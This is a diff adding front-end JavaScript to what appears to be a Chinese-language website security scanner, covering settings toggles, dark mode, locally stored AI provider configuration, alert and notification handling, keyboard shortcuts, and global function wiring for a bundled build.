+    target.style.display = 'block';
+    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+  if (tab === 'history') renderScanHistory();
+  if (tab === 'monitor') renderMonitorTargets();
+  if (tab === 'ai-config') renderAIConfig();
+  if (tab === 'alerts') loadAlerts();
+  if (tab === 'notifications') loadNotificationSettings();
+}
+
+function toggleSetting(el, key) {
+  let span = document.getElementById('setting-' + key);
+  if (!span) return;
+  let isOn = span.dataset.enabled === 'true';
+  span.dataset.enabled = isOn ? 'false' : 'true';
+  span.classList.toggle('on', !isOn);
+  let newState = !isOn;
+  // Real dark mode toggle
+  if (key === 'darkMode') {
+    if (newState) {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      (function(){try{localStorage.setItem('vs_dark','1');}catch(e){}})();
+    } else {
+      document.documentElement.removeAttribute('data-theme');
+      (function(){try{localStorage.removeItem('vs_dark');}catch(e){}})();
+    }
+    updateThemeIcon(newState);
+  }
+  // Real auto-save toggle
+  if (key === 'autoSave') {
+    (function(){try{localStorage.setItem('vs_autosave',newState?'1':'0');}catch(e){}})();
+  }
+  showToast('设置已更新');
+}
+
+function getAIConfig() {
+  try {
+    let raw = localStorage.getItem('vs_ai_config');
+    if (raw) return JSON.parse(raw);
+  } catch (e) {}
+  return { api_key: '', provider: 'openai', model: '', use_llm: true };
+}
+
+function saveAIConfig() {
+  let apiKey = document.getElementById('ai-config-apikey').value.trim();
+  let provider = document.getElementById('ai-config-provider').value;
+  let model = document.getElementById('ai-config-model').value.trim();
+  let useLLM = document.getElementById('setting-useLLM').dataset.enabled === 'true';
+  let config = { api_key: apiKey, provider: provider, model: model, use_llm: useLLM };
+  try {
+    localStorage.setItem('vs_ai_config', JSON.stringify(config));
+    showToast('AI 配置已保存');
+  } catch (e) {
+    showToast('保存失败：' + (e.message || '浏览器存储受限'), 'error');
+  }
+}
+
+function clearAIConfig() {
+  try {
+    localStorage.removeItem('vs_ai_config');
+    document.getElementById('ai-config-apikey').value = '';
+    document.getElementById('ai-config-provider').value = 'openai';
+    document.getElementById('ai-config-model').value = '';
+    let span = document.getElementById('setting-useLLM');
+    if (span) { span.dataset.enabled = 'true'; span.textContent = '已开启'; span.style.color = 'var(--success)'; }
+    showToast('AI 配置已清除');
+  } catch (e) {}
+}
+
+function toggleAISetting(key) {
+  let span = document.getElementById('setting-' + (key === 'useLLM' ? 'useLLM' : key));
+  if (!span) return;
+  let isOn = span.dataset.enabled === 'true';
+  span.dataset.enabled = isOn ? 'false' : 'true';
+  span.classList.toggle('on', !isOn);
+}
+
+// ===== Notification / Alert Functions =====
+function loadAlerts(page) {
+  page = page || 1;
+  let listEl = document.getElementById('alerts-list');
+  if (!listEl) return;
+  listEl.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-secondary)">加载中...</div>';
+  fetch('/api/alerts?limit=20&unread_only=false', { headers: authHeaders() })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      let alerts = data.alerts || [];
+      if (alerts.length === 0) {
+        listEl.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无告警记录</div>';
+        document.getElementById('alerts-pagination').style.display = 'none';
+        return;
+      }
+      let html = '';
+      alerts.forEach(function(a) {
+        let isRead = a.is_read ? true : false;
+        let badge = '';
+        if (a.alert_type === 'high_risk_found' || a.alert_type === 'monitor_down') badge = '<span style="background:var(--danger);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">高危</span>';
+        else if (a.alert_type === 'score_drop') badge = '<span style="background:var(--warning);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">评分下降</span>';
+        else if (a.alert_type === 'scan_complete') badge = '<span style="background:var(--success);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">完成</span>';
+        html += '<div class="menu-item" style="margin-bottom:8px;opacity:' + (isRead ? '0.7' : '1') + '">';
+        html += '<div style="flex:1">';
+        html += '<div style="font-weight:600;font-size:14px">' + escapeHtml(a.title || a.message || '告警') + badge + '</div>';
+        html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">' + escapeHtml(a.created_at || '') + '</div>';
+        html += '<div style="font-size:13px;color:var(--text);margin-top:4px">' + escapeHtml(a.message || '') + '</div>';
+        html += '</div>';
+        if (!isRead) {
+          html += '<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:8px;white-space:nowrap" onclick="markAlertRead(' + a.id + ', event)">标记已读</button>';
+        }
+        html += '</div>';
+      });
+      listEl.innerHTML = html;
+      document.getElementById('alerts-pagination').style.display = 'none';
+      updateAlertBadge();
+    })
+    .catch(function(e) {
+      listEl.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-secondary)">加载失败</div>';
+    });
+}
+
+function markAlertRead(alertId, ev) {
+  if (ev) ev.stopPropagation();
+  fetch('/api/alerts/' + alertId + '/read', { method: 'POST', headers: authHeaders() })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.success) { loadAlerts(); updateAlertBadge(); }
+    });
+}
+
+function markAllAlertsRead() {
+  fetch('/api/alerts?limit=100', { headers: authHeaders() })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      let alerts = data.alerts || [];
+      let unread = alerts.filter(function(a) { return !a.is_read; });
+      if (unread.length === 0) { showToast('没有未读告警'); return; }
+      let done = 0;
+      unread.forEach(function(a) {
+        fetch('/api/alerts/' + a.id + '/read', { method: 'POST', headers: authHeaders() })
+          .then(function() { done++; if (done >= unread.length) { loadAlerts(); updateAlertBadge(); showToast('已全部标记为已读'); } });
+      });
+    });
+}
+
+function updateAlertBadge() {
+  if (!isLoggedIn()) {
+    let badge = document.getElementById('nav-alert-badge');
+    if (badge) badge.style.display = 'none';
+    return;
+  }
+  fetch('/api/alerts/unread-count', { headers: authHeaders() })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      let badge = document.getElementById('nav-alert-badge');
+      if (!badge) return;
+      let count = data.unread_count || 0;
+      if (count > 0) {
+        badge.textContent = count > 99 ? '99+' : count;
+        badge.style.display = 'inline-block';
+      } else {
+        badge.style.display = 'none';
+      }
+    });
+}
+
+function loadNotificationSettings() {
+  fetch('/api/me/notifications', { headers: authHeaders() })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.success) {
+        let emailEl = document.getElementById('notify-email-input');
+        let webhookEl = document.getElementById('notify-webhook-input');
+        let thresholdEl = document.getElementById('notify-threshold-select');
+        if (emailEl) emailEl.value = data.email || '';
+        if (webhookEl) webhookEl.value = data.webhook || '';
+        if (thresholdEl) thresholdEl.value = data.threshold || 'high';
+      }
+    });
+}
+
+function saveNotificationSettings() {
+  let email = document.getElementById('notify-email-input').value.trim();
+  let webhook = document.getElementById('notify-webhook-input').value.trim();
+  let threshold = document.getElementById('notify-threshold-select').value;
+  fetch('/api/me/notifications', {
+    method: 'POST',
+    headers: Object.assign({'Content-Type': 'application/json'}, authHeaders()),
+    body: JSON.stringify({ email: email, webhook: webhook, threshold: threshold }),
+  })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.success) { showToast('通知设置已保存', 'success'); }
+      else { showToast(data.error || '保存失败', 'error'); }
+    });
+}
+
+function toggleApiKeyVisibility() {
+  let input = document.getElementById('ai-config-apikey');
+  let btn = document.getElementById('ai-config-eye');
+  if (!input || !btn) return;
+  if (input.type === 'password') {
+    input.type = 'text';
+    btn.textContent = '隐藏';
+  } else {
+    input.type = 'password';
+    btn.textContent = '显示';
+  }
+}
+
+function renderAIConfig() {
+  let config = getAIConfig();
+  let apiKeyEl = document.getElementById('ai-config-apikey');
+  let providerEl = document.getElementById('ai-config-provider');
+  let modelEl = document.getElementById('ai-config-model');
+  let useLLMEl = document.getElementById('setting-useLLM');
+  if (apiKeyEl) apiKeyEl.value = config.api_key || '';
+  if (providerEl) providerEl.value = config.provider || 'openai';
+  if (modelEl) modelEl.value = config.model || '';
+  if (useLLMEl) {
+    let on = config.use_llm !== false;
+    useLLMEl.dataset.enabled = on ? 'true' : 'false';
+    useLLMEl.classList.toggle('on', on);
+  }
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+  // Mount full application template into the root container
+  let app = safeGetElement('app');
+  if (app && APP_TEMPLATE) {
+    app.innerHTML = APP_TEMPLATE;
+  }
+
+  // Remove skeleton screen
+  let skeleton = safeGetElement('skeleton-screen');
+  if (skeleton) skeleton.classList.add('hidden');
+  setTimeout(function() { if (skeleton) skeleton.style.display = 'none'; }, 350);
+
+  // 扫描深度档位切换 — 通过 .scan-depth-opt 的 click 事件绑定（兼容 iOS + 触屏）
+  let depthHints = { quick: '约 1-2 秒 · 仅响应头', standard: '约 3-5 秒 · 推荐', deep: '约 10+ 秒 · 含攻击测试' };
+  document.querySelectorAll('.scan-depth-opt').forEach(function(label) {
+    label.addEventListener('click', function(e) {
+      e.preventDefault();
+      let value = this.getAttribute('data-value');
+      // 同步 radio
+      let radio = this.querySelector('input[type="radio"]');
+      if (radio) {
+        radio.checked = true;
+        radio.dispatchEvent(new Event('change', { bubbles: true }));
+      }
+      // 视觉高亮切换
+      document.querySelectorAll('.scan-depth-opt').forEach(function(l) {
+        l.classList.remove('active');
+        l.style.background = 'var(--bg)';
+        l.style.color = 'var(--text)';
+      });
+      this.classList.add('active');
+      this.style.background = 'var(--primary)';
+      this.style.color = '#fff';
+      // 更新 hint
+      let hint = document.getElementById('depth-hint');
+      if (hint) hint.textContent = depthHints[value] || '约 3-5 秒 · 推荐';
+    });
+  });
+
+  try { updateProfileStats(); } catch(e) { console.warn('updateProfileStats error:', e); }
+  try { updateAuthUI(); } catch(e) { console.warn('updateAuthUI error:', e); }
+  try { renderAIConfig(); } catch(e) { console.warn('renderAIConfig error:', e); }
+  // 11-S：默认不自动跑真实扫描，避免与 step1 步骤冲突
+  // 用户点"重新扫描"或 combobox 变化时再触发
+  if (typeof loadTrendChart === 'function') loadTrendChart(30);
+  // 验证已保存的 token 是否仍有效（后端 secret 可能已变）
+  if (isLoggedIn()) {
+    authFetch('/api/history?limit=1').then(function(r) {
+      if (r.status === 401) {
+        // authFetch 内部已 doLogout
+        if (typeof showToast === 'function') showToast('登录已过期，请重新登录');
+      }
+    }).catch(function() { /* 静默处理 */ });
+  }
+  // Restore dark mode preference
+  try {
+    if (localStorage.getItem('vs_dark') === '1') {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      let dm = safeGetElement('setting-darkMode');
+      if (dm) { dm.dataset.enabled = 'true'; dm.textContent = '已开启'; dm.style.color = 'var(--success)'; }
+      updateThemeIcon(true);
+    }
+  } catch(e) {}
+
+  function toggleThemeQuick() {
+    let isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+    if (isDark) {
+      document.documentElement.removeAttribute('data-theme');
+      try { localStorage.removeItem('vs_dark'); } catch(e) {}
+      let dm = safeGetElement('setting-darkMode');
+      if (dm) { dm.dataset.enabled = 'false'; dm.textContent = '未开启'; dm.style.color = 'var(--text-lighter)'; }
+      showToast('已切换至亮色模式');
+    } else {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      try { localStorage.setItem('vs_dark', '1'); } catch(e) {}
+      let dm = safeGetElement('setting-darkMode');
+      if (dm) { dm.dataset.enabled = 'true'; dm.textContent = '已开启'; dm.style.color = 'var(--success)'; }
+      showToast('已切换至暗色模式');
+    }
+    updateThemeIcon(!isDark);
+  }
+  window.toggleThemeQuick = toggleThemeQuick;
+
+  function updateThemeIcon(isDark) {
+    let icon = safeGetElement('theme-icon');
+    if (!icon) return;
+    if (isDark) {
+      icon.innerHTML = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>';
+    } else {
+      icon.innerHTML = '<circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>';
+    }
+  }
+  window.updateThemeIcon = updateThemeIcon;
+
+  // Enter key handlers for forms
+  let loginPass = safeGetElement('login-password');
+  if (loginPass) { loginPass.addEventListener('keydown', function(e) { if (e.key === 'Enter') doLogin(); }); }
+  let regEmail = safeGetElement('reg-email');
+  let regPass = safeGetElement('reg-password');
+  let regConfirm = safeGetElement('reg-password2');
+  if (regEmail) { regEmail.addEventListener('keydown', function(e) { if (e.key === 'Enter') doRegister(); }); }
+  if (regPass) { regPass.addEventListener('keydown', function(e) { if (e.key === 'Enter') doRegister(); }); }
+  if (regConfirm) { regConfirm.addEventListener('keydown', function(e) { if (e.key === 'Enter') doRegister(); }); }
+  let scanUrl = safeGetElement('scan-url');
+  if (scanUrl) { scanUrl.addEventListener('keydown', function(e) { if (e.key === 'Enter') goVerifyStep2(); }); }
+
+  // 全局键盘快捷键
+  document.addEventListener('keydown', function(e) {
+    // Esc 关闭弹窗 + AI 聊天窗
+    if (e.key === 'Escape') {
+      let aiChat = document.getElementById('ai-chat');
+      if (aiChat && aiChat.classList.contains('show')) {
+        aiChat.classList.remove('show');
+        aiChat.style.display = '';
+        return;
+      }
+      let modals = document.querySelectorAll('.modal.show, [id$="-modal"][style*="display: block"]');
+      modals.forEach(function(m) { m.style.display = 'none'; m.classList.remove('show'); });
+    }
+    // Ctrl/Cmd + K 跳到扫描输入框
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+      e.preventDefault();
+      let url = document.getElementById('scanUrl') || document.getElementById('scan-url');
+      if (url) { url.focus(); url.select(); }
+    }
+    // Ctrl/Cmd + / 切换 AI 顾问
+    if ((e.ctrlKey || e.metaKey) && e.key === '/') {
+      e.preventDefault();
+      let aiBtn = document.querySelector('[onclick*="aiChat" i], [onclick*="openAiAdvisor" i], [onclick*="showAiChat" i], #ai-advisor-btn, .ai-advisor-fab');
+      // 退化方案：直接找底部浮动按钮
+      if (!aiBtn) aiBtn = document.querySelector('button[aria-label*="安全顾问" i], button[aria-label*="AI" i]');
+      if (aiBtn) aiBtn.click();
+      else if (typeof toggleAiChat === 'function') toggleAiChat();
+      else if (typeof openAiAdvisor === 'function') openAiAdvisor();
+    }
+  });
+
+  // 数字滚动动画（首屏数据条）
+  function animateCounters() {
+    let counters = document.querySelectorAll('.counter[data-count]');
+    counters.forEach(function(c) {
+      let target = parseInt(c.getAttribute('data-count'), 10);
+      let suffix = c.getAttribute('data-suffix') || '';
+      let duration = 1200;
+      let start = 0;
+      let startTime = null;
+      function step(ts) {
+        if (!startTime) startTime = ts;
+        let progress = Math.min((ts - startTime) / duration, 1);
+        let eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
+        let current = Math.floor(start + (target - start) * eased);
+        c.textContent = current + suffix;
+        if (progress < 1) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
+    });
+  }
+  // 仅在 home 页加载时触发
+  if (document.querySelector('.counter[data-count]')) {
+    setTimeout(animateCounters, 300);
+  }
+
+  // 11-S: 暴露模板中内联 onclick 需要调用的函数到 window
+  // Vite 打包为 ES Module 后，模块内函数不会自动成为全局函数
+  window.navigateTo = navigateTo;
+  window.startScanDirect = startScanDirect;
+  window.startScan = startScan;
+  window.goVerifyStep2 = goVerifyStep2;
+  window.cancelScan = cancelScan;
+  window.quickDemo = quickDemo;
+  window.showFullScanDetail = showFullScanDetail;
+  window.downloadReport = downloadReport;
+  window.toggleAIChat = toggleAIChat;
+  window.sendAIMessage = sendAIMessage;
+  window.askAIQuick = askAIQuick;
+  window.showBatchScanModal = showBatchScanModal;
+  window.closeBatchScanModal = closeBatchScanModal;
+  window.doBatchScan = doBatchScan;
+  window.copyToken = copyToken;
+  window.selectVerifyMethod = selectVerifyMethod;
+  window.confirmVerification = confirmVerification;
+  window.skipVerification = skipVerification;
+  window.loadPublicDemo = loadPublicDemo;
+  window.analyzeFixer = analyzeFixer;
+  window.loadSampleConfig = loadSampleConfig;
+  window.clearFixer = clearFixer;
+  window.goToFixerWithScanResult = goToFixerWithScanResult;
+  window.switchFixLang = switchFixLang;
+  window.addAsset = addAsset;
+  window.switchTicketTab = switchTicketTab;
+  window.batchUpdateTickets = batchUpdateTickets;
+  window.batchDeleteTickets = batchDeleteTickets;
+  window.doLogin = doLogin;
+  window.doRegister = doRegister;
+  window.doLogout = doLogout;
+  window.doResetPassword = doResetPassword;
+  window.toggleAuthForm = toggleAuthForm;
+  window.showProfileTab = showProfileTab;
+  window.clearScanHistory = clearScanHistory;
+  window.cancelHistoryCompare = cancelHistoryCompare;
+  window.doHistoryCompare = doHistoryCompare;
+  window.addMonitorTarget = addMonitorTarget;
+  window.markAllAlertsRead = markAllAlertsRead;
+  window.toggleSetting = toggleSetting;
+  window.saveNotificationSettings = saveNotificationSettings;
+  window.toggleApiKeyVisibility = toggleApiKeyVisibility;
+  window.saveAIConfig = saveAIConfig;
+  window.clearAIConfig = clearAIConfig;
+  window.scanRedirectTarget = scanRedirectTarget;
+  window.scanAsset = scanAsset;
+  window.copyFixCode = copyFixCode;
+  window.extractError = extractError;
+  window.friendlyError = friendlyError;
+  // loadTrendChart 在模板中被引用但未定义，提供空实现避免报错
+  window.loadTrendChart = function(days) {
+    console.log('loadTrendChart(' + days + ') not implemented in this build');
+  };
+});
